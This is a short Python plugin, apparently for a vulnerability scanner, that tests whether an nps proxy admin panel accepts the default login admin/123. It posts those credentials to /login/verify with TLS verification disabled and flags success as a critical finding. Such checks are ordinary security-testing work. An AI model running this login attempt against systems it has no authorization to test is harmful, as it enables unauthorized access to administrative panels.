#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'nps默认口令',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/5/15',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'X-Requested-With':'XMLHttpRequest',
      'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
      }
  target = '/login/verify'
  data = 'username=admin&password=123'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    # print(res.text)
    # print(res.content)
    if res.status_code == 200 and re.search(r'msg.*?login success.*?status.*?1',res.text,re.S):
      ret['huixian'] = 'admin:123'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret